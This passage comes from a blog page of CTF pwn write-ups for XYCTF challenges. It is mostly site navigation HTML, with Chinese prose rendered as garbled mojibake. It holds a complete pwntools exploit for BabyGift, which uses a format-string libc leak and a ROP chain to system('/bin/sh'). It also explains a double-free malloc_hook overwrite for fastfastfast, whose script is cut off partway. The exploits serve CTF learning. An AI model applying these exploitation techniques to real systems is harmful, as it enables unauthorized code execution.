aria-label="malloc_flag" class="vp-link nav-link vp-sidebar-link vp-heading nav-link vp-sidebar-link vp-heading" href="/posts/pwn/competition/xyctf/xyctf.html#malloc-flag"><!---->malloc_flag<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-label="EZ1.0?(mips)" class="vp-link nav-link vp-sidebar-link vp-heading nav-link vp-sidebar-link vp-heading" href="/posts/pwn/competition/xyctf/xyctf.html#ez1-0-mips"><!---->EZ1.0?(mips)<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-label="EZ2.0?(arm)" class="vp-link nav-link vp-sidebar-link vp-heading nav-link vp-sidebar-link vp-heading" href="/posts/pwn/competition/xyctf/xyctf.html#ez2-0-arm"><!---->EZ2.0?(arm)<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-label="one_byte" class="vp-link nav-link vp-sidebar-link vp-heading nav-link vp-sidebar-link vp-heading" href="/posts/pwn/competition/xyctf/xyctf.html#one-byte"><!---->one_byte<!----></a><ul class="vp-sidebar-sub-headers"><li class="vp-sidebar-sub-header"><a aria-label="åŠ«æŒfreechunk" class="vp-link nav-link vp-sidebar-link vp-heading nav-link vp-sidebar-link vp-heading" href="/posts/pwn/competition/xyctf/xyctf.html#åŠ«æŒfreechunk"><!---->åŠ«æŒfreechunk<!----></a><ul class="vp-sidebar-sub-headers"></ul></li></ul></li><li class="vp-sidebar-sub-header"><a aria-label="ptmalloc2_its_myheap" class="vp-link nav-link vp-sidebar-link vp-heading nav-link vp-sidebar-link vp-heading" href="/posts/pwn/competition/xyctf/xyctf.html#ptmalloc2-its-myheap"><!---->ptmalloc2_its_myheap<!----></a><ul class="vp-sidebar-sub-headers"><li class="vp-sidebar-sub-header"><a aria-label="åŠ«æŒhead chunk" class="vp-link nav-link vp-sidebar-link vp-heading nav-link vp-sidebar-link vp-heading" href="/posts/pwn/competition/xyctf/xyctf.html#åŠ«æŒhead-chunk"><!---->åŠ«æŒhead chunk<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-label="è„šæœ¬" class="vp-link nav-link vp-sidebar-link vp-heading nav-link vp-sidebar-link vp-heading" href="/posts/pwn/competition/xyctf/xyctf.html#è„šæœ¬-2"><!---->è„šæœ¬<!----></a><ul class="vp-sidebar-sub-headers"></ul></li></ul></li><li class="vp-sidebar-sub-header"><a aria-label="ptmalloc2 it&#39;s myheap pro (glibc2.35ä¸‹çš„exitå‡½æ•°æ‰“æ³•)" class="vp-link nav-link vp-sidebar-link vp-heading nav-link vp-sidebar-link vp-heading" href="/posts/pwn/competition/xyctf/xyctf.html#ptmalloc2-it-s-myheap-pro-glibc2-35ä¸‹çš„exitå‡½æ•°æ‰“æ³•"><!---->ptmalloc2 it&#39;s myheap pro (glibc2.35ä¸‹çš„exitå‡½æ•°æ‰“æ³•)<!----></a><ul class="vp-sidebar-sub-headers"><li class="vp-sidebar-sub-header"><a aria-label="å®¡é¢˜" class="vp-link nav-link vp-sidebar-link vp-heading nav-link vp-sidebar-link vp-heading" href="/posts/pwn/competition/xyctf/xyctf.html#å®¡é¢˜"><!---->å®¡é¢˜<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-label="å¤§è‡´åˆ©ç”¨åŸç†:" class="vp-link nav-link vp-sidebar-link vp-heading nav-link vp-sidebar-link vp-heading" href="/posts/pwn/competition/xyctf/xyctf.html#å¤§è‡´åˆ©ç”¨åŸç†"><!---->å¤§è‡´åˆ©ç”¨åŸç†:<!----></a><ul class="vp-sidebar-sub-headers"></ul></li></ul></li><li class="vp-sidebar-sub-header"><a aria-label="ptmalloc2 it&#39;s myheap plusï¼ˆorw+exitï¼‰" class="vp-link nav-link vp-sidebar-link vp-heading nav-link vp-sidebar-link vp-heading" href="/posts/pwn/competition/xyctf/xyctf.html#ptmalloc2-it-s-myheap-plus-orw-exit"><!---->ptmalloc2 it&#39;s myheap plusï¼ˆorw+exitï¼‰<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-label="static_link" class="vp-link nav-link vp-sidebar-link vp-heading nav-link vp-sidebar-link vp-heading" href="/posts/pwn/competition/xyctf/xyctf.html#static-link"><!---->static_link<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-label="simple_srop" class="vp-link nav-link vp-sidebar-link vp-heading nav-link vp-sidebar-link vp-heading" href="/posts/pwn/competition/xyctf/xyctf.html#simple-srop"><!---->simple_srop<!----></a><ul class="vp-sidebar-sub-headers"></ul></li></ul><!--]--></li></ul></section></li></ul></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-heading clickable" type="button"><!----><span class="vp-sidebar-title">Heap</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-heading clickable" type="button"><!----><span class="vp-sidebar-title">Io File</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-heading clickable" type="button"><!----><span class="vp-sidebar-title">Linux</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-heading clickable" type="button"><!----><span class="vp-sidebar-title">Php Pwn</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-heading clickable" type="button"><!----><span class="vp-sidebar-title">Stack</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-heading clickable" type="button"><!----><span class="vp-sidebar-title">Tool Skill</span><span class="vp-arrow end"></span></button><!----></section></li></ul></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-heading clickable" type="button"><!----><span class="vp-sidebar-title">Re</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-heading clickable" type="button"><!----><span class="vp-sidebar-title">T O D O(æ­£åœ¨æ–½å·¥)</span><span class="vp-arrow end"></span></button><!----></section></li><li><!--[--><a aria-label="å‹æƒ…é“¾æ¥" class="vp-link nav-link vp-sidebar-link vp-sidebar-page nav-link vp-sidebar-link vp-sidebar-page" href="/posts/friendLink.html"><!---->å‹æƒ…é“¾æ¥<!----></a><ul class="vp-sidebar-sub-headers"></ul><!--]--></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-heading clickable" type="button"><!----><span class="vp-sidebar-title">å¯†ç å­¦</span><span class="vp-arrow end"></span></button><!----></section></li><li><!--[--><a aria-label="é¢è¯•å‡†å¤‡(çƒ­æ›´)" class="vp-link nav-link vp-sidebar-link vp-sidebar-page nav-link vp-sidebar-link vp-sidebar-page" href="/posts/sycKernel.html"><!---->é¢è¯•å‡†å¤‡(çƒ­æ›´)<!----></a><ul class="vp-sidebar-sub-headers"></ul><!--]--></li></ul><!--[--><!----><!--]--></aside><!--[--><main id="main-content" class="vp-page"><!--[--><!--[--><!----><!--]--><!----><nav class="vp-breadcrumb disable"></nav><div class="vp-page-title"><h1><!---->PWN</h1><div class="page-info"><span class="page-author-info" aria-label="AuthorğŸ–Š" data-balloon-pos="down"><svg xmlns="http://www.w3.org/2000/svg" class="icon author-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="author icon"><path d="M649.6 633.6c86.4-48 147.2-144 147.2-249.6 0-160-128-288-288-288s-288 128-288 288c0 108.8 57.6 201.6 147.2 249.6-121.6 48-214.4 153.6-240 288-3.2 9.6 0 19.2 6.4 25.6 3.2 9.6 12.8 12.8 22.4 12.8h704c9.6 0 19.2-3.2 25.6-12.8 6.4-6.4 9.6-16 6.4-25.6-25.6-134.4-121.6-240-243.2-288z"></path></svg><span><span class="page-author-item">Elegy</span></span><span property="author" content="Elegy"></span></span><!----><span class="page-date-info" aria-label="Writing DateğŸ“…" data-balloon-pos="down"><svg xmlns="http://www.w3.org/2000/svg" class="icon calendar-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="calendar icon"><path d="M716.4 110.137c0-18.753-14.72-33.473-33.472-33.473-18.753 0-33.473 14.72-33.473 33.473v33.473h66.993v-33.473zm-334.87 0c0-18.753-14.72-33.473-33.473-33.473s-33.52 14.72-33.52 33.473v33.473h66.993v-33.473zm468.81 33.52H716.4v100.465c0 18.753-14.72 33.473-33.472 33.473a33.145 33.145 0 01-33.473-33.473V143.657H381.53v100.465c0 18.753-14.72 33.473-33.473 33.473a33.145 33.145 0 01-33.473-33.473V143.657H180.6A134.314 134.314 0 0046.66 277.595v535.756A134.314 134.314 0 00180.6 947.289h669.74a134.36 134.36 0 00133.94-133.938V277.595a134.314 134.314 0 00-133.94-133.938zm33.473 267.877H147.126a33.145 33.145 0 01-33.473-33.473c0-18.752 14.72-33.473 33.473-33.473h736.687c18.752 0 33.472 14.72 33.472 33.473a33.145 33.145 0 01-33.472 33.473z"></path></svg><span><!----></span><meta property="datePublished" content="2024-05-06T02:39:03.000Z"></span><!----><span class="page-reading-time-info" aria-label="Reading TimeâŒ›" data-balloon-pos="down"><svg xmlns="http://www.w3.org/2000/svg" class="icon timer-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="timer icon"><path d="M799.387 122.15c4.402-2.978 7.38-7.897 7.38-13.463v-1.165c0-8.933-7.38-16.312-16.312-16.312H256.33c-8.933 0-16.311 7.38-16.311 16.312v1.165c0 5.825 2.977 10.874 7.637 13.592 4.143 194.44 97.22 354.963 220.201 392.763-122.204 37.542-214.893 196.511-220.2 389.397-4.661 5.049-7.638 11.651-7.638 19.03v5.825h566.49v-5.825c0-7.379-2.849-13.981-7.509-18.9-5.049-193.016-97.867-351.985-220.2-389.527 123.24-37.67 216.446-198.453 220.588-392.892zM531.16 450.445v352.632c117.674 1.553 211.787 40.778 211.787 88.676H304.097c0-48.286 95.149-87.382 213.728-88.676V450.445c-93.077-3.107-167.901-81.297-167.901-177.093 0-8.803 6.99-15.793 15.793-15.793 8.803 0 15.794 6.99 15.794 15.793 0 80.261 63.69 145.635 142.01 145.635s142.011-65.374 142.011-145.635c0-8.803 6.99-15.793 15.794-15.793s15.793 6.99 15.793 15.793c0 95.019-73.789 172.82-165.96 177.093z"></path></svg><span>About 31 min</span><meta property="timeRequired" content="PT31M"></span><!----><!----></div><hr></div><div class="toc-place-holder"><aside id="toc"><!--[--><!----><!--]--><div class="toc-header">On This Page<button type="button" class="print-button" title="Print"><svg xmlns="http://www.w3.org/2000/svg" class="icon print-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="print icon"><path d="M819.2 364.8h-44.8V128c0-17.067-14.933-32-32-32H281.6c-17.067 0-32 14.933-32 32v236.8h-44.8C145.067 364.8 96 413.867 96 473.6v192c0 59.733 49.067 108.8 108.8 108.8h44.8V896c0 17.067 14.933 32 32 32h460.8c17.067 0 32-14.933 32-32V774.4h44.8c59.733 0 108.8-49.067 108.8-108.8v-192c0-59.733-49.067-108.8-108.8-108.8zM313.6 160h396.8v204.8H313.6V160zm396.8 704H313.6V620.8h396.8V864zM864 665.6c0 25.6-19.2 44.8-44.8 44.8h-44.8V588.8c0-17.067-14.933-32-32-32H281.6c-17.067 0-32 14.933-32 32v121.6h-44.8c-25.6 0-44.8-19.2-44.8-44.8v-192c0-25.6 19.2-44.8 44.8-44.8h614.4c25.6 0 44.8 19.2 44.8 44.8v192z"></path></svg></button></div><div class="toc-wrapper"><ul class="toc-list"><!--[--><li class="toc-item"><a class="vp-link toc-link level2 toc-link level2" href="#babygift">BabyGift</a></li><!----><!--]--><!--[--><li class="toc-item"><a class="vp-link toc-link level2 toc-link level2" href="#fastfastfast">fastfastfast</a></li><li><ul class="toc-list"><!--[--><li class="toc-item"><a class="vp-link toc-link level3 toc-link level3" href="#è„šæœ¬">è„šæœ¬</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="toc-item"><a class="vp-link toc-link level2 toc-link level2" href="#fmt">fmt</a></li><li><ul class="toc-list"><!--[--><li class="toc-item"><a class="vp-link toc-link level3 toc-link level3" href="#exit-hookåœ°å€å†™å…¥æ ˆ">exit hookåœ°å€å†™å…¥æ ˆ:</a></li><!----><!--]--><!--[--><li class="toc-item"><a class="vp-link toc-link level3 toc-link level3" href="#é€‰æ‹©">é€‰æ‹©</a></li><!----><!--]--><!--[--><li class="toc-item"><a class="vp-link toc-link level3 toc-link level3" href="#è„šæœ¬-1">è„šæœ¬</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="toc-item"><a class="vp-link toc-link level2 toc-link level2" href="#guestbook">GuestBook</a></li><!----><!--]--><!--[--><li class="toc-item"><a class="vp-link toc-link level2 toc-link level2" href="#hello-world">hello_world</a></li><!----><!--]--><!--[--><li class="toc-item"><a class="vp-link toc-link level2 toc-link level2" href="#intermittent">Intermittent</a></li><!----><!--]--><!--[--><li class="toc-item"><a class="vp-link toc-link level2 toc-link level2" href="#inviisible-flag">inviisible_flag</a></li><!----><!--]--><!--[--><li class="toc-item"><a class="vp-link toc-link level2 toc-link level2" href="#malloc-flag">malloc_flag</a></li><!----><!--]--><!--[--><li class="toc-item"><a class="vp-link toc-link level2 toc-link level2" href="#ez1-0-mips">EZ1.0?(mips)</a></li><!----><!--]--><!--[--><li class="toc-item"><a class="vp-link toc-link level2 toc-link level2" href="#ez2-0-arm">EZ2.0?(arm)</a></li><!----><!--]--><!--[--><li class="toc-item"><a class="vp-link toc-link level2 toc-link level2" href="#one-byte">one_byte</a></li><li><ul class="toc-list"><!--[--><li class="toc-item"><a class="vp-link toc-link level3 toc-link level3" href="#åŠ«æŒfreechunk">åŠ«æŒfreechunk</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="toc-item"><a class="vp-link toc-link level2 toc-link level2" href="#ptmalloc2-its-myheap">ptmalloc2_its_myheap</a></li><li><ul class="toc-list"><!--[--><li class="toc-item"><a class="vp-link toc-link level3 toc-link level3" href="#åŠ«æŒhead-chunk">åŠ«æŒhead chunk</a></li><!----><!--]--><!--[--><li class="toc-item"><a class="vp-link toc-link level3 toc-link level3" href="#è„šæœ¬-2">è„šæœ¬</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="toc-item"><a class="vp-link toc-link level2 toc-link level2" href="#ptmalloc2-it-s-myheap-pro-glibc2-35ä¸‹çš„exitå‡½æ•°æ‰“æ³•">ptmalloc2 it&#39;s myheap pro (glibc2.35ä¸‹çš„exitå‡½æ•°æ‰“æ³•)</a></li><li><ul class="toc-list"><!--[--><li class="toc-item"><a class="vp-link toc-link level3 toc-link level3" href="#å®¡é¢˜">å®¡é¢˜</a></li><!----><!--]--><!--[--><li class="toc-item"><a class="vp-link toc-link level3 toc-link level3" href="#å¤§è‡´åˆ©ç”¨åŸç†">å¤§è‡´åˆ©ç”¨åŸç†:</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="toc-item"><a class="vp-link toc-link level2 toc-link level2" href="#ptmalloc2-it-s-myheap-plus-orw-exit">ptmalloc2 it&#39;s myheap plusï¼ˆorw+exitï¼‰</a></li><!----><!--]--><!--[--><li class="toc-item"><a class="vp-link toc-link level2 toc-link level2" href="#static-link">static_link</a></li><!----><!--]--><!--[--><li class="toc-item"><a class="vp-link toc-link level2 toc-link level2" href="#simple-srop">simple_srop</a></li><!----><!--]--></ul><div class="toc-marker" style="top:-1.7rem;"></div></div><!--[--><!----><!--]--></aside></div><!--[--><!----><!--]--><div class="theme-hope-content"><h1 id="pwn" tabindex="-1"><a class="header-anchor" href="#pwn" aria-hidden="true">#</a> PWN</h1><h2 id="babygift" tabindex="-1"><a class="header-anchor" href="#babygift" aria-hidden="true">#</a> BabyGift</h2><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240422202855033.png" alt="image-20240422202855033" tabindex="0" loading="lazy"><figcaption>image-20240422202855033</figcaption></figure><ul><li>åˆ©ç”¨è¿™é‡Œä¼šè®©å­—ç¬¦ä¸²åœ°å€èµ‹å€¼ç»™rdi ç„¶åæˆ‘ä»¬é€šè¿‡åŠ«æŒç¨‹åºæµç¨‹è·‘åˆ°printfå¤„ åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°±èƒ½æ³„éœ²libcåœ°å€ ç„¶åè§¦å‘systemå‡½æ•°</li></ul><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)</span>
<span class="token comment"># context.terminal = [&#39;byobu&#39;, &#39;sp&#39;, &#39;-h&#39;]</span>


file_name <span class="token operator">=</span> <span class="token string">&quot;./vuln&quot;</span>
url <span class="token operator">=</span> <span class="token string">&quot;127.0.0.1&quot;</span>
port <span class="token operator">=</span> <span class="token number">64472</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
<span class="token comment"># p= process(file_name)</span>
<span class="token comment"># p = gdb.debug(file_name,&quot;b *Menu+113&quot;)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>url<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>  <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ra <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b&#39;\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#39;\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
pop_rbp <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x4012D0</span><span class="token punctuation">)</span>
lea_rax <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x4012A0</span> <span class="token punctuation">)</span>
bss <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x404020</span><span class="token operator">+</span><span class="token number">0x200</span><span class="token punctuation">)</span>
sub_rsp <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x4012DC</span><span class="token punctuation">)</span>
ret <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x40101a</span><span class="token punctuation">)</span>
mov_rax_0_pop_rbp <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x4012CB</span><span class="token punctuation">)</span>
mov_rax_printf <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x401202</span><span class="token punctuation">)</span>


ru<span class="token punctuation">(</span><span class="token string">b&quot;Your name:\n&quot;</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span><span class="token string">b&quot;elegy&quot;</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">b&quot;Your passwd:\n&quot;</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">b&quot;%27$p%11$p&quot;</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x404020</span><span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>mov_rax_printf <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x40122D</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>
sd<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
res <span class="token operator">=</span> rl<span class="token punctuation">(</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">128</span> <span class="token operator">-</span><span class="token number">0x29DC0</span>
stack_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;stack_addr&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
system_addr <span class="token operator">=</span> <span class="token number">0x50D70</span> <span class="token operator">+</span>libc_base
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">b&quot;Your name:\n&quot;</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span><span class="token string">b&quot;elegy&quot;</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">b&quot;Your passwd:\n&quot;</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">b&quot;/bin/sh\x00&quot;</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token punctuation">)</span> <span class="token operator">+</span>ret<span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="fastfastfast" tabindex="-1"><a class="header-anchor" href="#fastfastfast" aria-hidden="true">#</a> fastfastfast</h2><ul><li><p>ç®€å•çš„å †é¢˜ freeçš„æ—¶å€™æ²¡æœ‰åšä»»ä½•æ£€æµ‹ ç›´æ¥<code>double free</code> ç„¶åé€šè¿‡æŒ‡å‘bssè¡¨ä¸­ æ³„éœ²å‡ºæ ‡å‡†ioåœ°å€ä»è€Œæ¨ç®—å‡ºlibcåœ°å€</p><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240422211524070.png" alt="image-20240422211524070" tabindex="0" loading="lazy"><figcaption>image-20240422211524070</figcaption></figure></li><li><p><code>double free</code>åä»»æ„åœ°å€malloc</p><ul><li><img src="https://awaqwqa.github.io/img/xyctf/image-20240422211447696.png" alt="image-20240422211447696" tabindex="0" loading="lazy"><figcaption>image-20240422211447696</figcaption></li></ul></li><li><p>bssæ®µæ ‡å‡†è¾“å…¥è¾“å‡ºæµioåœ°å€ä¿¡æ¯</p><ul><li><img src="https://awaqwqa.github.io/img/xyctf/image-20240422211628353.png" alt="image-20240422211628353" tabindex="0" loading="lazy"><figcaption>image-20240422211628353</figcaption></li></ul></li><li><p>é€šè¿‡åœ¨gdbä¸­è¾“å…¥libcè·å–libcåŸºç¡€åœ°å€æ¥ç®—å’Œioä¹‹é—´çš„åœ°å€åå·®</p><ul><li><img src="https://awaqwqa.github.io/img/xyctf/image-20240422211647867.png" alt="image-20240422211647867" tabindex="0" loading="lazy"><figcaption>image-20240422211647867</figcaption></li></ul></li></ul><p>ç®—ä¸€ä¸‹åå·®å°±å¯ä»¥äº†</p><p>ç„¶åé€šè¿‡ç¬¬äºŒæ¬¡<code>double free</code> ä¿®æ”¹malloc hook ä¸ºonegadgetå³å¯</p><h3 id="è„šæœ¬" tabindex="-1"><a class="header-anchor" href="#è„šæœ¬" aria-hidden="true">#</a> è„šæœ¬</h3><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;mips&#39;,endian=&quot;little&quot;, log_level=&#39;debug&#39;)</span>
context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">&#39;linux&#39;</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">&#39;amd64&#39;</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">&#39;debug&#39;</span><span class="token punctuation">)</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;byobu&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;sp&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-h&#39;</span><span class="token punctuation">]</span>


file_name <span class="token operator">=</span> <span class="token string">&quot;./vuln&quot;</span>
url <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
port <span class="token operator">=</span> <span class="token number">1111</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
<span class="token comment"># p= process(file_name)</span>
p <span class="token operator">=</span> gdb<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>file_name<span class="token punctuation">,</span><span class="token string">&quot;b *main+42&quot;</span><span class="token punctuation">)</span>
<span class="token comment"># p = remote(url,port)</span>

sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>  <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
